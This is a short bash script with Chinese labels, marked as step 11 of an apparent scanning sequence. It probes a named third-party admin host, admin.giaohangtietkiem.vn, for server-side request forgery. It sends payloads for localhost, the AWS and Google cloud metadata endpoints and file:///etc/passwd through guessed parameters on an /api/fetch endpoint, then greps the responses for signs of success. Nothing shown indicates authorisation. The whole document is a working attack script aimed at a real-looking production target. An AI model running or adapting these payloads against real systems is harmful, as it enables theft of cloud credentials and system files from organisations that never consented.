#!/bin/bash
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "步骤11：SSRF测试"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

TARGET="admin.giaohangtietkiem.vn"

# SSRF payload
SSRF_PAYLOADS=(
    "http://127.0.0.1"
    "http://localhost"
    "http://169.254.169.254/latest/meta-data/"
    "http://metadata.google.internal/computeMetadata/v1/"
    "file:///etc/passwd"
    "http://[::1]"
)

echo "[*] 测试SSRF漏洞..."

# 可能的SSRF参数
PARAMS=("url" "link" "uri" "path" "file" "fetch" "proxy" "callback")

for param in "${PARAMS[@]}"; do
    for payload in "${SSRF_PAYLOADS[@]}"; do
        encoded=$(echo -n "$payload" | jq -sRr @uri)
        echo "  测试: $param=$payload"
        resp=$(curl -sk "https://$TARGET/api/fetch?${param}=${encoded}" -m 3 2>&1)
        
        if echo "$resp" | grep -qiE "root:|localhost|169.254"; then
            echo "    ⚠️  可能存在SSRF！"
        fi
    done
done

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "✅ SSRF测试完成"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
